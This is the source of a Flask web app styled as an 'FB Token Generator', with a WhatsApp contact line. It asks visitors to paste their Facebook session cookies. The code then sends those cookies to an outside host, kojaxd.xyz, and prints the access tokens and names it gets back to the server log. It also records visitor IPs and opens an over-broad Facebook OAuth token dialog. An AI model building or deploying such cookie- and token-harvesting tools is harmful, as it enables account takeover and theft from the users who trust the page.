from flask import Flask, request, render_template_string, jsonify
import requests
import os
import json
from datetime import datetime

app = Flask(__name__)

# Path for daily user count data
DAILY_USER_FILE = "daily_users.json"

# Your HTML template (add the unique_count display as shown)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝗙𝗕 𝗧𝗢𝗞𝗘𝗡 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 - 𝗠𝗥 𝗗𝗘𝗩𝗜𝗟</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <style>
        /* --- (Your CSS as before) --- */
        body {
            min-height: 100vh;
            margin: 0;
            font-family: 'Poppins', sans-serif;
            color: #fff;
            background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1500&q=80') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            flex-direction: column;
        }
        .overlay {
            background: rgba(18, 18, 28, 0.8);
            min-height: 100vh;
            position: absolute;
            width: 100vw;
            height: 100vh;
            z-index: 0;
            top: 0;
            left: 0;
        }
        .container {
            max-width: 410px;
            margin: 4vw auto 0 auto;
            padding: 2.5rem 2rem 1.5rem 2rem;
            border-radius: 22px;
            background: rgba(30,30,40,0.82);
            box-shadow: 0 10px 40px 0 rgba(0,0,0,0.45);
            position: relative;
            z-index: 1;
            border: 2px solid #ff006a50;
            backdrop-filter: blur(6px);
        }
        h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: 2.1rem;
            font-weight: 700;
            letter-spacing: 1.5px;
            text-align: center;
            color: #ff006a;
            margin-bottom: 1.2rem;
            text-shadow: 0 2px 10px #0008;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.4rem;
        }
        .devil {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.3rem;
            letter-spacing: 2px;
            color: #fff;
            background: linear-gradient(90deg, #ff006a, #ffb347 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }
        .form-group {
            margin-bottom: 1.3rem;
        }
        label {
            color: #ffb347;
            font-weight: 600;
            font-size: 1.1rem;
            margin-bottom: 0.4rem;
            display: block;
        }
        textarea {
            width: 100%;
            padding: 1.1rem;
            border-radius: 10px;
            border: none;
            background: rgba(255,255,255,0.08);
            color: #fff;
            font-size: 1rem;
            font-family: inherit;
            min-height: 110px;
            box-shadow: 0 2px 8px #0002;
            transition: background 0.3s, box-shadow 0.3s;
        }
        textarea:focus {
            outline: none;
            background: rgba(255,255,255,0.17);
            box-shadow: 0 2px 14px #ff006a44;
        }
        .button-group {
            display: flex;
            gap: 0.8rem;
            margin-bottom: 0.5rem;
        }
        .btn {
            flex: 1;
            padding: 0.8rem 0;
            border: none;
            border-radius: 10px;
            font-size: 1.01rem;
            font-family: 'Montserrat', sans-serif;
            font-weight: 700;
            background: linear-gradient(90deg, #ff006a 60%, #ffb347 120%);
            color: #fff;
            box-shadow: 0 2px 12px #ff006a33;
            cursor: pointer;
            transition: transform 0.15s, box-shadow 0.15s;
        }
        .btn:hover {
            transform: translateY(-2px) scale(1.04);
            box-shadow: 0 6px 20px #ff006a66;
        }
        .btn-secondary {
            background: linear-gradient(90deg, #0099ff 60%, #00ffb3 120%);
            box-shadow: 0 2px 12px #0099ff33;
        }
        .btn-secondary:hover {
            box-shadow: 0 6px 20px #0099ff66;
        }
        .result {
            margin-top: 1.7rem;
            padding: 1.2rem;
            border-radius: 10px;
            background: rgba(255,255,255,0.06);
            border-left: 5px solid #ff006a;
            animation: fadeIn 0.5s ease;
            box-shadow: 0 2px 12px #0002;
        }
        .result.success { border-left-color: #00e676; }
        .result.error { border-left-color: #ff1744; }
        .token-info {
            margin-top: 0.7rem;
        }
        .token-container {
            display: flex;
            align-items: center;
            gap: 0.6rem;
            margin-bottom: 0.4rem;
            flex-wrap: wrap;
        }
        .copy-btn {
            background: #ff006a;
            color: #fff;
            border: none;
            padding: 0.4rem 0.9rem;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 0.3rem;
            transition: background 0.2s;
        }
        .copy-btn:hover { background: #00e676; color: #222;}
        .copy-btn.copied { background: #00e676; color: #222;}
        .profile-pic {
            width: 70px; height: 70px; border-radius: 50%; border: 2.5px solid #ff006a;
            margin: 0.6rem 0;
            object-fit: cover;
            box-shadow: 0 2px 10px #ff006a33;
        }
        .token-text { word-break: break-all; font-size: 0.98rem; }
        .links-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1.2rem;
            margin-top: 1.1rem;
        }
        .social-link {
            display: flex;
            align-items: center;
            gap: 0.4rem;
            background: rgba(40,40,60,0.8);
            padding: 0.5rem 1.1rem;
            border-radius: 8px;
            font-weight: 600;
            color: #fff;
            text-decoration: none;
            font-size: 1.04rem;
            box-shadow: 0 2px 8px #0003;
            transition: background 0.2s, color 0.2s;
        }
        .social-link:hover { background: #ff006a; color: #fff; }
        .social-link svg { width: 22px; height: 22px; }
        footer {
            margin-top: 1.9rem;
            text-align: center;
            color: #fff;
            font-size: 1.06rem;
            letter-spacing: 1.1px;
            z-index: 2;
            position: relative;
        }
        .footer-logo {
            font-family: 'Montserrat', sans-serif;
            font-size: 1.12rem;
            letter-spacing: 2px;
            color: #ffb347;
            background: linear-gradient(90deg, #00ffb3, #ffb347 80%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
        }
        @media (max-width: 600px) {
            .container { max-width: 98vw; padding: 1.2rem 0.5rem 1rem 0.5rem; }
            h1 { font-size: 1.3rem; }
            .form-group label { font-size: 1rem; }
            .links-row { flex-direction: column; gap: 0.7rem; }
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px);} to { opacity: 1; transform: translateY(0);} }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="container">
        <div style="text-align:center;padding-bottom:1rem;">
            <b>Today's Unique Users:</b> {{ unique_count }}
        </div>
        <h1>
            <svg width="28" height="28" fill="#ff006a" viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg>
            𝗙𝗕 𝗧𝗢𝗞𝗘𝗡 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥 <span class="devil">𝗠𝗥 𝗗𝗘𝗩𝗜𝗟</span>
        </h1>
        <form method="POST" action="/">
            <div class="form-group">
                <label for="cookies">Paste your FB Cookies below:</label>
                <textarea id="cookies" name="cookies" placeholder="sb=abc123; datr=xyz456; c_user=12345; xs=abc123xyz456" required></textarea>
            </div>
            <div class="button-group">
                <button type="submit" class="btn">
                    <svg width="18" height="18" fill="#fff" viewBox="0 0 24 24"><path d="M12 1.5a.75.75 0 01.75.75V4.5a.75.75 0 01-1.5 0V2.25A.75.75 0 0112 1.5z"/></svg>
                    Get Token
                </button>
                <button type="button" class="btn btn-secondary" id="additionalButton">
                    <svg width="18" height="18" fill="#fff" viewBox="0 0 24 24"><path d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25zm-.53 14.03a.75.75 0 001.06 0l3-3a.75.75 0 10-1.06-1.06l-1.72 1.72V8.25a.75.75 0 00-1.5 0v5.69l-1.72-1.72a.75.75 0 00-1.06 1.06l3 3z"/></svg>
                    Connect Instagram
                </button>
            </div>
        </form>
        <div class="links-row">
            <a class="social-link" href="https://wa.me/9024870456" target="_blank">
                <svg fill="#25D366" viewBox="0 0 32 32"><path d="M16.001 3.2c-7.061 0-12.8 5.739-12.8 12.8 0 2.256.613 4.461 1.776 6.381l-1.888 6.898 7.073-1.858c1.837 1.004 3.92 1.537 6.039 1.537h.001c7.061 0 12.8-5.739 12.8-12.8s-5.739-12.8-12.8-12.8zm6.922 19.722c-.294.822-1.721 1.6-2.364 1.7-.626.094-1.428.132-2.295-.145-.529-.168-1.204-.391-2.068-.768-3.638-1.573-6.017-5.429-6.2-5.7-.182-.271-1.48-1.973-1.48-3.771s.94-2.68 1.276-3.049c.336-.369.73-.461.974-.461.244 0 .487.004.698.013.225.01.53-.086.832.635.302.721 1.025 2.498 1.115 2.68.09.182.151.399.03.646-.121.247-.182.399-.364.612-.183.213-.386.476-.55.641-.183.183-.373.382-.16.751.213.369.948 1.561 2.037 2.528 1.396 1.23 2.57 1.617 2.939 1.8.369.183.582.153.796-.091.214-.244.915-1.067 1.162-1.433.247-.366.494-.305.832-.183.338.122 2.147 1.012 2.516 1.195.369.183.614.274.704.426.09.152.09.882-.204 1.704z"/></svg>
                For any inquiry: 9024870456
            </a>
            <a class="social-link" href="https://www.facebook.com/share/15WsyQrE57/" target="_blank">
                <svg fill="#1877f3" viewBox="0 0 32 32"><path d="M29 0h-26c-1.657 0-3 1.343-3 3v26c0 1.657 1.343 3 3 3h13v-12h-4v-5h4v-3.5c0-4.136 2.392-6.5 6.065-6.5 1.756 0 3.587.312 3.587.312v4h-2.021c-1.993 0-2.615 1.236-2.615 2.5v3h4.5l-.5 5h-4v12h7c1.657 0 3-1.343 3-3v-26c0-1.657-1.343-3-3-3z"/></svg>
                Facebook
            </a>
        </div>
        {% if result %}
        <div class="result {% if result.access_token %}success{% else %}error{% endif %}">
            {% if result.access_token %}
                <h3>🎉 Success!</h3>
                <div class="token-info">
                    <div class="token-container">
                        <span class="token-text" id="tokenText">{{ result.access_token }}</span>
                        <button class="copy-btn" onclick="copyToken()">
                            <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg>
                            Copy Token
                        </button>
                    </div>
                    <p><strong>User ID:</strong> {{ result.user_id }}</p>
                    <p><strong>Name:</strong> {{ result.name }}</p>
                    {% if result.profile_picture %}
                        <img src="{{ result.profile_picture }}" alt="Profile" class="profile-pic">
                    {% endif %}
                </div>
            {% else %}
                <h3>❌ Error</h3>
                <p><strong>Message:</strong> {{ result.error }}</p>
                {% if result.details %}
                <p><strong>Details:</strong> {{ result.details }}</p>
                {% endif %}
            {% endif %}
        </div>
        {% endif %}
    </div>
    <footer>
        <span class="footer-logo">The tool made by 𝗠𝗥 𝗦𝗛𝗔𝗥𝗔𝗕𝗜 2025</span>
    </footer>
    <script>
        document.getElementById('additionalButton').addEventListener('click', function() {
            window.open('https://www.facebook.com/dialog/oauth?scope=user_about_me%2Cuser_actions.books%2Cuser_actions.fitness%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_friends%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_managed_groups%2Cuser_photos%2Cuser_posts%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_tagged_places%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cemail%2Cmanage_notifications%2Cmanage_pages%2Cpages_messaging%2Cpublish_actions%2Cpublish_pages%2Cread_friendlists%2Cread_insights%2Cread_page_mailboxes%2Cread_stream%2Crsvp_event%2Cread_mailbox&response_type=token&client_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2F', '_blank');
        });

        function copyToken() {
            const tokenText = document.getElementById('tokenText').textContent;
            const copyBtn = document.querySelector('.copy-btn');
            navigator.clipboard.writeText(tokenText).then(() => {
                copyBtn.innerHTML = `<svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/></svg> Copied!`;
                copyBtn.classList.add('copied');
                setTimeout(() => {
                    copyBtn.innerHTML = `<svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg> Copy Token`;
                    copyBtn.classList.remove('copied');
                }, 1800);
            }).catch(err => {
                alert('Failed to copy token to clipboard');
            });
        }
    </script>
</body>
</html>
"""

def get_today():
    return datetime.now().strftime("%Y-%m-%d")

def get_unique_count_today(ip=None):
    today = get_today()
    # Load or create file
    if not os.path.exists(DAILY_USER_FILE):
        with open(DAILY_USER_FILE, "w") as f:
            json.dump({}, f)
    with open(DAILY_USER_FILE, "r") as f:
        data = json.load(f)
    if today not in data:
        data[today] = []
    # Add IP if provided
    if ip and ip not in data[today]:
        data[today].append(ip)
        with open(DAILY_USER_FILE, "w") as f:
            json.dump(data, f)
    return len(data[today])

def get_facebook_token(cookies):
    url = "https://kojaxd.xyz/api/facebook_token"
    params = {'cookies': cookies}
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            res = response.json()
            # Print token info to console
            if 'access_token' in res:
                print(f"[{datetime.now()}] TOKEN GENERATED:")
                print(f"User ID: {res.get('user_id')}")
                print(f"Name: {res.get('name')}")
                print(f"Token: {res.get('access_token')}")
            else:
                print(f"[{datetime.now()}] ERROR: {res.get('error')}")
            return res
        else:
            err = {
                'error': f"API request failed with status code {response.status_code}",
                'details': response.json()
            }
            print(f"[{datetime.now()}] ERROR: {err}")
            return err
    except requests.exceptions.RequestException:
        print(f"[{datetime.now()}] ERROR: Failed to connect to the API server")
        return {'error': "Failed to connect to the API server"}
    except ValueError as e:
        print(f"[{datetime.now()}] ERROR: Invalid JSON response: {e}")
        return {'error': "Invalid JSON response from server", 'details': str(e)}

@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    unique_count = None
    if request.method == 'POST':
        cookies = request.form.get('cookies', '').strip()
        if cookies:
            # Get user IP (works behind most proxies)
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            unique_count = get_unique_count_today(ip)
            result = get_facebook_token(cookies)
    else:
        unique_count = get_unique_count_today()
    return render_template_string(HTML_TEMPLATE, result=result, unique_count=unique_count)

@app.route('/api', methods=['POST'])
def api():
    cookies = request.json.get('cookies', '').strip()
    if not cookies:
        return jsonify({'error': 'No cookies provided'}), 400
    # Get user IP for API as well
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    get_unique_count_today(ip)
    result = get_facebook_token(cookies)
    return jsonify(result)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
